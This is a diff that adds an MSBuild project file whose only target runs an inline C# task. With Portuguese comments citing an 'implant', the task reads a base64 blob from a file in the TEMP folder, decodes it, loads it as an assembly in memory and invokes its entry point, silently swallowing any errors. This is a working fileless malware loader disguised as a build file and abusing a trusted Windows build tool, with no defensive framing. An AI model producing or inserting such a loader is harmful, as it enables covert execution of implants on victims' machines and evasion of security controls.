@@ -1,0 +1,25 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="ShadowReactor">
+   <HookTask />
+  </Target>
+  <UsingTask TaskName="HookTask" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+            try {
+                // Procura o arquivo .txt na pasta TEMP
+                string path = Environment.GetEnvironmentVariable("TEMP") + @"\qpwoe64.txt";
+                if (System.IO.File.Exists(path)) {
+                    string content = System.IO.File.ReadAllText(path).Trim();
+                    byte[] b = Convert.FromBase64String(content);
+                    // Carrega o binário diretamente na memória
+                    System.Reflection.Assembly a = System.Reflection.Assembly.Load(b);
+                    // Invoca o método Main(string[] args) do implant.cs
+                    a.EntryPoint.Invoke(null, new object[] { new string[] { } });
+                }
+            } catch (Exception e) { }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
